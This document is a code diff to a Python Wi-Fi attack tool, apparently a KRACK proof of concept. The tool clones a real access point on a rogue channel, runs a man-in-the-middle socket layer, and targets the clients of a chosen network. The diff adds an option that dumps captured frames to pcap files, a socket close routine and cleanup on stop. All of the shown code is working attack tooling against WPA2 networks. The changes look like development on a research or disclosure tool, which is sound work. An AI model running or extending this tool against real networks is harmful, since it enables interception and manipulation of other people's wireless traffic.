@@ -21,7 +21,6 @@ from wpaspy import Ctrl
 # - ACK frames of the real AP sent to ALL clients (currently we only call those of the targeted client)
 # - Handle forwarded messages that are too long (= stupid Linux kernel bug)
 # - When the client immediately sends data on the rogue channel, it will be deauthenticated by the rogue kernel
-# - Option to make a debug pcap capture
 
 IEEE_TLV_TYPE_SSID    = 0
 IEEE_TLV_TYPE_CHANNEL = 3
@@ -50,10 +49,17 @@ def log(level, msg, color=None, showtime=True):
 #### Packet Processing Functions ####
 
 class MitmSocket(L2Socket):
+	def __init__(self, dumpfile=None, **kwargs):
+		super(MitmSocket, self).__init__(**kwargs)
+		self.pcap = None
+		if dumpfile:
+			self.pcap = PcapWriter("%s.%s.pcap" % (dumpfile, kwargs["iface"]), append=True, sync=True)
+
 	def send(self, p):
 		# Hack: set the More Data flag so we can detect injected frames
 		p[Dot11].FCfield |= 0x20
 		L2Socket.send(self, RadioTap()/p)
+		if self.pcap: self.pcap.write(p)
 		log(DEBUG, "Injected frame: %s" % dot11_to_str(p))
 
 	def _strip_fcs(self, p):
@@ -77,14 +83,21 @@ class MitmSocket(L2Socket):
 	def recv(self):
 		p = L2Socket.recv(self)
 		if p == None or not Dot11 in p: return None
+		if self.pcap: self.pcap.write(p)
+
 		# Hack: ignore frames that we just injected and are echoed back by the kernel
 		if p[Dot11].FCfield & 0x20 != 0:
 			log(DEBUG, "Ignoring echoed injected frame: %s (0x%02X)" % (dot11_to_str(p), p[Dot11].FCfield))
 			return None
 		else:
 			log(ALL, "Received frame: %s" % dot11_to_str(p))
+
 		# Strip the FCS if present, and drop the RadioTap header
 		return self._strip_fcs(p)
+
+	def close(self):
+		if self.pcap: self.pcap.close()
+		super(MitmSocket, self).close()
 
 
 def xorstr(lhs, rhs):
@@ -338,10 +351,11 @@ class ClientState():
 
 
 class KRAckAttack():
-	def __init__(self, nic_real, nic_rogue_ap, nic_rogue_mon, ssid, clientmac=None):
+	def __init__(self, nic_real, nic_rogue_ap, nic_rogue_mon, ssid, clientmac=None, dumpfile=None):
 		self.nic_real = nic_real
 		self.nic_rogue_ap = nic_rogue_ap
 		self.nic_rogue_mon = nic_rogue_mon
+		self.dumpfile = dumpfile
 		self.ssid = ssid
 		self.beacon = None
 		self.apmac = None
@@ -601,14 +615,11 @@ class KRAckAttack():
 			print_rx(INFO, "Rogue channel", p)
 
 
-
 	def run(self):
 		# Make sure to use a recent backports driver package so we can indeed
 		# capture and inject packets in monitor mode.
-		#self.sock_real  = conf.L2socket(type=ETH_P_ALL, iface=self.nic_real)
-		#self.sock_rogue = conf.L2socket(type=ETH_P_ALL, iface=self.nic_rogue_mon)
-		self.sock_real  = MitmSocket(type=ETH_P_ALL, iface=self.nic_real)
-		self.sock_rogue = MitmSocket(type=ETH_P_ALL, iface=self.nic_rogue_mon)
+		self.sock_real  = MitmSocket(type=ETH_P_ALL, iface=self.nic_real     , dumpfile=self.dumpfile)
+		self.sock_rogue = MitmSocket(type=ETH_P_ALL, iface=self.nic_rogue_mon, dumpfile=self.dumpfile)
 
 		# Test monitor mode and get MAC address of the network -- FIXME: we can also attack any network its connected to
 		self.find_beacon(self.ssid)
@@ -664,14 +675,16 @@ class KRAckAttack():
 				nextbeacon += 0.01
 
 	def stop(self):
-		log(STATUS, "Closing hostapd ...")
+		log(STATUS, "Closing hostapd and cleaning up ...")
 		if self.hostapd:
 			self.hostapd.terminate()
 			self.hostapd.wait()
+		if self.sock_real: self.sock_real.close()
+		if self.sock_rogue: self.sock_rogue.close()
+
 
 def cleanup():
 	attack.stop()
-
 
 if __name__ == "__main__":
 	# TODO: Optional interface to manually provide a monitor interface for the rogue channel
@@ -682,12 +695,13 @@ if __name__ == "__main__":
 	parser.add_argument('ssid', help='The SSID of the network to attack.')
 	parser.add_argument('--nic_rogue_mon', help='Wireless monitor interface that will listen on the channel of the rogue (cloned) AP.')
 	parser.add_argument('--clientmac', help='Only attack clients with the given MAC adress.')
+	parser.add_argument('--dump', help='Dump captured traffic to the pcap files <this argument name>.<nic>.pcap')
 	args = parser.parse_args()
 
 	if args.nic_rogue_mon is None:
 		args.nic_rogue_mon = args.nic_rogue_ap + "mon"
 
-	attack = KRAckAttack(args.nic_real_ap, args.nic_rogue_ap, args.nic_rogue_mon, args.ssid, args.clientmac)
+	attack = KRAckAttack(args.nic_real_ap, args.nic_rogue_ap, args.nic_rogue_mon, args.ssid, args.clientmac, args.dump)
 
 	atexit.register(cleanup)
 	attack.run()
